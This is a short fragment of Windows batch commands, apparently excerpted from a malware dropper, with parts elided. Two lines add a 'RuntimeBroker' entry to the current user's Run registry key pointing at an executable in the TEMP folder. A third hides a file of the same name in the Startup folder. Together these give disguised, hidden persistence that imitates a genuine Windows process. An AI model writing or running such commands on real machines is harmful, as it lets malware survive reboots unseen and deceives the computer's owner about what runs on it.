...
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "RuntimeBroker" /t REG_SZ /d "%TEMP%\RuntimeBroker.exe" /f >nul
...
REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V RuntimeBroker /t REG_SZ /F /D %TEMP%\RuntimeBroker.exe
attrib +h "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RuntimeBroker.exe" /s /d
